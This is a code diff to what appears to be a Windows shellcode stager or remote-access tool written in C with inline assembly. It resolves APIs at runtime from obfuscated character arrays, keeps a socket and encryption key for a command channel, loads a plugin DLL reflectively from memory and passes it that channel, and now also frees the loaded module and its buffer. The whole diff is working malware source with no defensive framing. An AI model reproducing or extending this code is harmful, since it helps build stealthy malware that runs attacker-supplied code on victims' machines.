@@ -13,6 +13,7 @@ typedef BOOL (WINAPI *_CryptDecrypt)(HCRYPTKEY hKey, HCRYPTHASH hHash, BOOL Fina
 typedef BOOL (WINAPI *_CryptEncrypt)(HCRYPTKEY hKey, HCRYPTHASH hHash, BOOL Final, DWORD dwFlags, BYTE *pbData, DWORD *pdwDataLen, DWORD dwBufLen);
 //msvcrt.dll
 typedef void * (__cdecl *_malloc)(size_t _Size);
+typedef void (__cdecl *_free)(void *memblock);
 
 struct SHELLCODE_CONTEXT{
     HMODULE                         KERNEL32;
@@ -26,6 +27,7 @@ struct SHELLCODE_CONTEXT{
     _CryptEncrypt                   CryptEncrypt_;
     HMODULE                         MSVCRT;
     _malloc                         malloc__;
+    _free                           free_;
     /**/
     SOCKET                          hSocket;
     HCRYPTKEY                       hKey;
@@ -48,6 +50,7 @@ void scInit(_LoadLibraryA pLoadLibA, _GetProcAddress pGPA, SOCKET hSocket, HCRYP
 void Start(_LoadLibraryA pLoadLibA, _GetProcAddress pGPA, SOCKET hSocket, HCRYPTKEY hKEY);
 void Payload(SHELLCODE_CONTEXT *scc);
 
+void FreeLibraryFromMemory(void* AddrBase);
 void PEEntry();
 void PELoadIAT();
 void PEBaseReloc();
@@ -334,7 +337,7 @@ HINSTANCE __declspec(naked) LoadLibraryFromMemory(void* AddrBase,const char* Mod
     }
 }
 
-void __declspec(naked)FreeLibraryFromMemory(){
+void __declspec(naked)FreeLibraryFromMemory(void* AddrBase){
     __asm{
         push	ebp
         mov	ebp, esp
@@ -941,7 +944,9 @@ void Payload(SHELLCODE_CONTEXT *scc){
                     char sPluginName[]  = {'p', 'm', '.', 'd', 'l', 'l', '\0'};
                     char sPMEntry[]     = {'I', 'n', 'i', 't', 'P', 'l', 'u', 'g', 'i', 'n', 'L', 'o', 'a', 'd','e', 'r', '@', '1', '2', '\0'};
                     PVOID hMod = (PVOID)LoadLibraryFromMemory(bBuff, sPluginName);
+                    //Si hemos podido cargar el PM...
                     if (hMod){
+                        //Creamos la estructura que recibe
                         typedef int (WINAPI *InitPluginLoader)(SOCKET hConexion, HCRYPTKEY hKey, LoaderFunTable& lFunc);
                         InitPluginLoader MainFunc = (InitPluginLoader)scc->GetProcAddress_A_((HMODULE)hMod, sPMEntry);
                         LoaderFunTable LFT;
@@ -949,7 +954,12 @@ void Payload(SHELLCODE_CONTEXT *scc){
                         LFT.LLFM                    = (LoadLibraryFromMemory_)((PBYTE)LoadLibraryFromMemory + scc->Delta);
                         LFT.GetProcAddress          = (unsigned long**)((PBYTE)GetProcAddress_ + scc->Delta);
                         LFT.LoadLibraryA            = (unsigned long**)((PBYTE)LoadLibraryA_ + scc->Delta);
+                        //y ejecutamos el Main
                         MainFunc(scc->hSocket, scc->hKey, LFT);
+                        //Si el PM nos retorna la ejecución descargamos la DLL de memoria
+                        FreeLibraryFromMemory(hMod);
+                        //y eliminamos el buffer
+                        scc->free_(bBuff - 4);
                     }
                 }
             }
@@ -995,7 +1005,8 @@ find_delta:
     char sCryptEncrypt[]    = {'C', 'r', 'y', 'p', 't', 'E', 'n', 'c', 'r', 'y', 'p', 't', '\0'};
 
     char sMSVCRT[]          = {'m', 's', 'v', 'c', 'r', 't', '\0'};
-    char smalloc_[]          = {'m', 'a', 'l', 'l', 'o', 'c', '\0'};
+    char smalloc_[]         = {'m', 'a', 'l', 'l', 'o', 'c', '\0'};
+    char sfree_[]           = {'f', 'r', 'e', 'e', '\0'};
 
     scc.WS2_32              = pLoadLibA(sWS2_32);
     scc.send_               = (_send)pGPA(scc.WS2_32, ssend);
@@ -1006,7 +1017,8 @@ find_delta:
     scc.CryptEncrypt_       = (_CryptEncrypt)pGPA(scc.ADVAPI32, sCryptEncrypt);
 
     scc.MSVCRT              = pLoadLibA(sMSVCRT);
-    scc.malloc__             = (_malloc)pGPA(scc.MSVCRT, smalloc_);
+    scc.malloc__            = (_malloc)pGPA(scc.MSVCRT, smalloc_);
+    scc.free_               = (_free)pGPA(scc.MSVCRT, sfree_);
 
     //Parcheamos direcciones para LoadLibraryFromMemory()
     *(DWORD*)((PBYTE)LoadLibraryA_ + tDelta + 1)            = (DWORD)pLoadLibA;
